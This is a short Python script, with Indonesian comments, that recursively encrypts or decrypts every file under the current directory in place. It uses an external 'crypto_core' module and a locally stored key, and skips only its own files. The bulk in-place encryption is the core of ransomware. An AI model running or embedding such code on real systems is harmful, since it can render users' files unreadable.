import os
import sys
import crypto_core

KEY_FILE = "permanent.key"

# load / simpan key permanen
if os.path.exists(KEY_FILE):
    with open(KEY_FILE, "rb") as f:
        crypto_core.encryption_key = f.read()
else:
    with open(KEY_FILE, "wb") as f:
        f.write(crypto_core.encryption_key)

if len(sys.argv) != 2:
    print("Usage:")
    print("  python main.py encrypt")
    print("  python main.py decrypt")
    sys.exit(1)

mode = sys.argv[1]

for root, dirs, files in os.walk("."):
    for file in files:
        # skip file sistem sendiri
        if file in ["main.py", "crypto_core.py", "permanent.key", "README.md"]:
            continue

        path = os.path.join(root, file)

        try:
            if mode == "encrypt":
                crypto_core.encrypt_file(path)
                print("[ENCRYPTED]", path)
            elif mode == "decrypt":
                crypto_core.decrypt_file(path)
                print("[DECRYPTED]", path)
        except Exception as e:
            print("[SKIPPED]", path)
